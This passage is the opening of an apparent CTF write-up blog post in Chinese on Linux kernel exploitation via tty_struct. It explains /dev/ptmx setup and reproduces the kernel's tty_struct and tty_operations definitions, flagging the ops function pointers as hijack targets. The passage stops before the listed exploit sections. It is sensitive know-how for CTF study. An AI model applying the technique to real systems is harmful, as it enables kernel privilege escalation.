<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>kernel tty_struct | Lingze&#39;s blog</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="ctfer">
    <meta name="keywords" content="ctfer">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.415d0a97.css" as="style"><link rel="preload" href="/assets/js/app.01f8cc77.js" as="script"><link rel="preload" href="/assets/js/2.5ece5099.js" as="script"><link rel="preload" href="/assets/js/32.045dc002.js" as="script"><link rel="prefetch" href="/assets/js/10.f923d8b8.js"><link rel="prefetch" href="/assets/js/100.cf64d3e9.js"><link rel="prefetch" href="/assets/js/11.19955ff8.js"><link rel="prefetch" href="/assets/js/12.e16d4c4d.js"><link rel="prefetch" href="/assets/js/13.0552f541.js"><link rel="prefetch" href="/assets/js/14.78d67d73.js"><link rel="prefetch" href="/assets/js/15.d342dfc4.js"><link rel="prefetch" href="/assets/js/16.36f247d6.js"><link rel="prefetch" href="/assets/js/17.031ae63f.js"><link rel="prefetch" href="/assets/js/18.7c49a89e.js"><link rel="prefetch" href="/assets/js/19.2d69c943.js"><link rel="prefetch" href="/assets/js/20.e845eb34.js"><link rel="prefetch" href="/assets/js/21.e398898d.js"><link rel="prefetch" href="/assets/js/22.6efd51e5.js"><link rel="prefetch" href="/assets/js/23.21d2b263.js"><link rel="prefetch" href="/assets/js/24.3231fe48.js"><link rel="prefetch" href="/assets/js/25.26e66a19.js"><link rel="prefetch" href="/assets/js/26.ddde99c2.js"><link rel="prefetch" href="/assets/js/27.f8e523dc.js"><link rel="prefetch" href="/assets/js/28.2c1ddb1d.js"><link rel="prefetch" href="/assets/js/29.f15cca3e.js"><link rel="prefetch" href="/assets/js/3.c087139c.js"><link rel="prefetch" href="/assets/js/30.2d433b5b.js"><link rel="prefetch" href="/assets/js/31.87dbaed0.js"><link rel="prefetch" href="/assets/js/33.db01bde8.js"><link rel="prefetch" href="/assets/js/34.d177d280.js"><link rel="prefetch" href="/assets/js/35.360c2104.js"><link rel="prefetch" href="/assets/js/36.afbabc8a.js"><link rel="prefetch" href="/assets/js/37.8e60e299.js"><link rel="prefetch" href="/assets/js/38.c6a43a23.js"><link rel="prefetch" href="/assets/js/39.08102dc6.js"><link rel="prefetch" href="/assets/js/4.28fb810e.js"><link rel="prefetch" href="/assets/js/40.5767c7d7.js"><link rel="prefetch" href="/assets/js/41.307bcf10.js"><link rel="prefetch" href="/assets/js/42.daf03989.js"><link rel="prefetch" href="/assets/js/43.952d68dc.js"><link rel="prefetch" href="/assets/js/44.cbeef42b.js"><link rel="prefetch" href="/assets/js/45.fbd2a9f2.js"><link rel="prefetch" href="/assets/js/46.a92ae456.js"><link rel="prefetch" href="/assets/js/47.24f82953.js"><link rel="prefetch" href="/assets/js/48.fa3498f4.js"><link rel="prefetch" href="/assets/js/49.a64774f2.js"><link rel="prefetch" href="/assets/js/5.0660e0b3.js"><link rel="prefetch" href="/assets/js/50.d0ed88cd.js"><link rel="prefetch" href="/assets/js/51.50727b96.js"><link rel="prefetch" href="/assets/js/52.2756affe.js"><link rel="prefetch" href="/assets/js/53.2739f473.js"><link rel="prefetch" href="/assets/js/54.f0b71120.js"><link rel="prefetch" href="/assets/js/55.94d5a5ee.js"><link rel="prefetch" href="/assets/js/56.637c3b4a.js"><link rel="prefetch" href="/assets/js/57.7b7e3fee.js"><link rel="prefetch" href="/assets/js/58.812bae5d.js"><link rel="prefetch" href="/assets/js/59.70fe1d63.js"><link rel="prefetch" href="/assets/js/6.c52e1544.js"><link rel="prefetch" href="/assets/js/60.0e6a01d3.js"><link rel="prefetch" href="/assets/js/61.702e5198.js"><link rel="prefetch" href="/assets/js/62.38f55e44.js"><link rel="prefetch" href="/assets/js/63.b505c9de.js"><link rel="prefetch" href="/assets/js/64.5489c9d8.js"><link rel="prefetch" href="/assets/js/65.3db6e034.js"><link rel="prefetch" href="/assets/js/66.3605a461.js"><link rel="prefetch" href="/assets/js/67.00d97ed9.js"><link rel="prefetch" href="/assets/js/68.78ef741a.js"><link rel="prefetch" href="/assets/js/69.808ca1f4.js"><link rel="prefetch" href="/assets/js/7.9920c8ea.js"><link rel="prefetch" href="/assets/js/70.15347f58.js"><link rel="prefetch" href="/assets/js/71.b9acfd65.js"><link rel="prefetch" href="/assets/js/72.7e1140f3.js"><link rel="prefetch" href="/assets/js/73.874f0e99.js"><link rel="prefetch" href="/assets/js/74.117bb7d4.js"><link rel="prefetch" href="/assets/js/75.964e2dfe.js"><link rel="prefetch" href="/assets/js/76.2df26afd.js"><link rel="prefetch" href="/assets/js/77.93ebe7b7.js"><link rel="prefetch" href="/assets/js/78.67c6c9bb.js"><link rel="prefetch" href="/assets/js/79.0d846438.js"><link rel="prefetch" href="/assets/js/8.f3c32733.js"><link rel="prefetch" href="/assets/js/80.4716a5b6.js"><link rel="prefetch" href="/assets/js/81.d8c3b2d2.js"><link rel="prefetch" href="/assets/js/82.ea63e06a.js"><link rel="prefetch" href="/assets/js/83.4d1ef8ae.js"><link rel="prefetch" href="/assets/js/84.32a22fe7.js"><link rel="prefetch" href="/assets/js/85.7fb3f862.js"><link rel="prefetch" href="/assets/js/86.4d386fc9.js"><link rel="prefetch" href="/assets/js/87.a095878a.js"><link rel="prefetch" href="/assets/js/88.69d77356.js"><link rel="prefetch" href="/assets/js/89.21ebadb4.js"><link rel="prefetch" href="/assets/js/9.d8b27656.js"><link rel="prefetch" href="/assets/js/90.d49929b7.js"><link rel="prefetch" href="/assets/js/91.cc956227.js"><link rel="prefetch" href="/assets/js/92.b72e3535.js"><link rel="prefetch" href="/assets/js/93.a76f52a2.js"><link rel="prefetch" href="/assets/js/94.82a77dbd.js"><link rel="prefetch" href="/assets/js/95.b0cec47e.js"><link rel="prefetch" href="/assets/js/96.87307703.js"><link rel="prefetch" href="/assets/js/97.c731aa62.js"><link rel="prefetch" href="/assets/js/98.1e36c988.js"><link rel="prefetch" href="/assets/js/99.914f1e07.js">
    <link rel="stylesheet" href="/assets/css/0.styles.415d0a97.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open no-sidebar have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Lingze's blog" class="logo"> <span class="site-name can-hide">Lingze's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/avatar2.jpg"> <div class="blogger-info"><h3>lingze</h3> <span>bin不是垃圾桶的意思!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav>  <!----> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-1baff76c><div class="articleInfo" data-v-1baff76c><ul class="breadcrumbs" data-v-1baff76c><li data-v-1baff76c><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1baff76c></a></li> <li data-v-1baff76c><a href="/categories/?category=ctf_wp" title="分类" data-v-1baff76c>ctf_wp</a></li><li data-v-1baff76c><a href="/categories/?category=kernel" title="分类" data-v-1baff76c>kernel</a></li></ul> <div class="info" data-v-1baff76c><div title="作者" class="author iconfont icon-touxiang" data-v-1baff76c><a href="https://github.com/wlingze" target="_blank" title="作者" class="beLink" data-v-1baff76c>lingze</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1baff76c><a href="javascript:;" data-v-1baff76c>2022-02-13</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">kernel tty_struct<!----></h1> <!----> <div class="theme-vdoing-content content__default"><h1 id="kernel-tty-struct-exp"><a href="#kernel-tty-struct-exp" class="header-anchor">#</a> kernel tty_struct exp</h1> <p></p><div class="table-of-contents"><ul><li><a href="#tty-struct">tty_struct</a><ul><li><a href="#ptmx">ptmx</a></li><li><a href="#定义">定义</a></li><li><a href="#tty-ops">tty-&gt;ops</a></li><li><a href="#利用">利用</a></li><li><a href="#write-执行流">write 执行流</a></li></ul></li><li><a href="#利用">利用</a><ul><li><a href="#fake-ops">Fake_ops</a></li><li><a href="#fake-stack">fake_stack</a></li><li><a href="#kernel-rop">kernel rop</a></li><li><a href="#exp">exp</a></li></ul></li></ul></div><p></p> <h2 id="tty-struct"><a href="#tty-struct" class="header-anchor">#</a> tty_struct</h2> <p>Linux下一个特殊的驱动文件，是默认集成在linux中的， 代码在<code>driver/tty</code>文件夹。主要文件在 <code>pty.c</code>，</p> <h3 id="ptmx"><a href="#ptmx" class="header-anchor">#</a> ptmx</h3> <p>可以看到其对应的 <code>file_operations</code>结构，定义为<code>ptmx_fops</code>，</p> <p>然后可以看到对应的<code>__init</code>函数，驱动载入的初始化代码在 <code>unix98_pty_init</code>函数，</p> <p><img src="https://s2.loli.net/2022/02/13/WzgQPvNn5L7Mofi.png" alt="image-20220213185023138"></p> <p>在此函数最后， 设置了文件 <code>&quot;/dev/ptmx&quot;</code>，</p> <p><img src="https://s2.loli.net/2022/02/13/FiWT3E8YnXSvkVl.png" alt="image-20220213184120686"></p> <p>在这里也可以看到我们的<code>ptmx_fops.open</code>被设置为了 <code>ptmx_open</code>函数，</p> <h3 id="定义"><a href="#定义" class="header-anchor">#</a> 定义</h3> <p>我们的主角: <code>struct tty_struct</code>结构体定义在 <code>include/linux/tty.h</code>，</p> <p>其实唯一需要注意的是第四位的<code>ops</code>: <code>const struct tty_operations *ops;</code>，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span>     magic<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">kref</span> kref<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">tty_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>
        <span class="token keyword">int</span> index<span class="token punctuation">;</span>

        <span class="token comment">/* Protects ldisc changes: Lock tty not pty */</span>
        <span class="token keyword">struct</span> <span class="token class-name">ld_semaphore</span> ldisc_sem<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">tty_ldisc</span> <span class="token operator">*</span>ldisc<span class="token punctuation">;</span>

        <span class="token keyword">struct</span> <span class="token class-name">mutex</span> atomic_write_lock<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">mutex</span> legacy_mutex<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">mutex</span> throttle_mutex<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">rw_semaphore</span> termios_rwsem<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">mutex</span> winsize_mutex<span class="token punctuation">;</span>
        <span class="token class-name">spinlock_t</span> ctrl_lock<span class="token punctuation">;</span>
        <span class="token class-name">spinlock_t</span> flow_lock<span class="token punctuation">;</span>
        <span class="token comment">/* Termios values are protected by the termios rwsem */</span>
        <span class="token keyword">struct</span> <span class="token class-name">ktermios</span> termios<span class="token punctuation">,</span> termios_locked<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">termiox</span> <span class="token operator">*</span>termiox<span class="token punctuation">;</span>        <span class="token comment">/* May be NULL for unsupported */</span>
        <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">pid</span> <span class="token operator">*</span>pgrp<span class="token punctuation">;</span>               <span class="token comment">/* Protected by ctrl lock */</span>
        <span class="token keyword">struct</span> <span class="token class-name">pid</span> <span class="token operator">*</span>session<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span>
        <span class="token keyword">int</span> count<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">winsize</span> winsize<span class="token punctuation">;</span>         <span class="token comment">/* winsize_mutex */</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stopped<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token comment">/* flow_lock */</span>
                      flow_stopped<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
                      unused<span class="token operator">:</span>BITS_PER_LONG <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> hw_stopped<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ctrl_status<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span>    <span class="token comment">/* ctrl_lock */</span>
                      packet<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
                      unused_ctrl<span class="token operator">:</span>BITS_PER_LONG <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> receive_room<span class="token punctuation">;</span>      <span class="token comment">/* Bytes free for queue */</span>
        <span class="token keyword">int</span> flow_change<span class="token punctuation">;</span>

        <span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>link<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">fasync_struct</span> <span class="token operator">*</span>fasync<span class="token punctuation">;</span>
        <span class="token keyword">int</span> alt_speed<span class="token punctuation">;</span>          <span class="token comment">/* For magic substitution of 38400 bps */</span>
        <span class="token class-name">wait_queue_head_t</span> write_wait<span class="token punctuation">;</span>
        <span class="token class-name">wait_queue_head_t</span> read_wait<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">work_struct</span> hangup_work<span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token operator">*</span>disc_data<span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token operator">*</span>driver_data<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">list_head</span> tty_files<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N_TTY_BUF_SIZE</span> <span class="token expression"><span class="token number">4096</span></span></span>

        <span class="token keyword">int</span> closing<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>write_buf<span class="token punctuation">;</span>
        <span class="token keyword">int</span> write_cnt<span class="token punctuation">;</span>
        <span class="token comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>
        <span class="token keyword">struct</span> <span class="token class-name">work_struct</span> SAK_work<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">tty_port</span> <span class="token operator">*</span>port<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><p>这个<code>tty_operations</code>定义在<code>include/linux/tty_driver.h</code>,  可以看到 大量的hook位。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">tty_operations</span> <span class="token punctuation">{</span>
        <span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>lookup<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span>
                        <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>install<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>close<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>shutdown<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>cleanup<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>write<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> tty<span class="token punctuation">,</span>
                      <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token keyword">int</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>put_char<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>flush_chars<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>write_room<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>chars_in_buffer<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span>  <span class="token punctuation">(</span><span class="token operator">*</span>ioctl<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span>
                    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>compat_ioctl<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span>
                             <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_termios<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ktermios</span> <span class="token operator">*</span> old<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>throttle<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>unthrottle<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span> tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>stop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>start<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>hangup<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>break_ctl<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">int</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>flush_buffer<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_ldisc<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
